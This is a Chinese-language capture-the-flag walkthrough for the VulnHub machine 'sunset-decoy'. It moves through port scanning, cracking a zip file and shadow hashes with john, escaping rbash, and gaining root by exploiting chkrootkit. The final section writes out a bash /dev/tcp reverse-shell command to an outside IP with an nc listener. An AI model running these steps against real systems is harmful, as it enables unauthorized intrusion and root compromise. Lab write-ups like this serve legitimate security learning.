

## 靶机地址

https://www.vulnhub.com/entry/sunset-decoy,505/

## 信息收集

全端口扫描发现服务，并扫描其版本

```shell
sudo masscan -p1-65535,U:1-65535 172.16.33.40 --rate=5000 -e tun0
sudo nmap -p22,80 -sV -A 172.16.33.40
```

| 端口 | 服务   | 利用点               | 结果 |
| ---- | ------ | -------------------- | ---- |
| 80   | apache | save.zip             | 待定 |
| 22   | Ssh    | 暂无，必要时考虑爆破 | 暂无 |

访问80端口，将save.zip下载下来

![](https://cos.kevinc.ltd/file/download?fileId=1074)

使用`john`破解压缩包密码，得到`etc`

```shell
zip2john save.zip > save.hash
john save.hash --wordlist=rockyou.txt
```



`etc`中有`passwd`和`shadow`,可以结合破解

```shell
unshadow passwd shadow > unshadow
john --rules --wordlists=rockyou.txt unshadow
```

可以破解出某个账户 ( 账户名一长串，不想打了，以guest代替吧！) 的密码为`server`



`ssh`进去后查看文件

![](https://cos.kevinc.ltd/file/download?fileId=1075)

> 后期截图，有一些是我后面传上去的文件，可以看到有普通用户proof文件user.txt，但由于shell为rbash，需要绕过



## Get shell

`shell`为`rbash`, 所以需要绕过

```shell
-t "bash --no-profile" # ssh后面加
```

进去以后查看命令无法使用，查看环境变量，`echo $PATH`

![](https://cos.kevinc.ltd/file/download?fileId=1076)

当前环境变量为家目录，无法直接使用命令

```shell
# 改为
PATH=/usr/local/sbin/:/usr/sbin/bin/:/usr/sbin/:/usr/bin/://sbin/:/bin/
```

可查看`user.txt`

![](https://cos.kevinc.ltd/file/download?fileId=1077)



## 提权

上传`linpeas.sh`, 赋予执行权限后运行

```shell
可疑提权向量（尽量忽略内核提权）：

数据库配置文件： /etc/mysql/mariadb.cnf 可读

suid权限：

pkexec 利用没成功
sudo  查看版本是否有漏洞  漏洞需要管理员权限修改文件

SV502/log.txt

```

发现`SV502/logs/log.txt` 日志文件里有提到`chkrootkit`，该文件用于检测系统中是否被安装rootkit的

主目录中存在`honeypot.decoy`，为`root`用户所有，尝试运行

![](https://cos.kevinc.ltd/file/download?fileId=1078)

**5**是`AV扫描`,猜测跟`chkrootkit`有关，尝试运行

使用`ps aux | grep chkrootkit`，知道`chkrootkit`为`root`运行

![](https://cos.kevinc.ltd/file/download?fileId=1081)

使用`searchsploit chkrootkit`查看利用方法

![](https://cos.kevinc.ltd/file/download?fileId=1080)

利用方法很简单

```shell
echo "bash -c 'exec bash -i &>/dev/tcp/10.8.0.86/4444 <&1'" > /tmp/update
./honeypot.decoy

#kali
nc -nvlp 4444
```

<img src="https://cos.kevinc.ltd/file/download?fileId=1083" style="zoom:50%;" />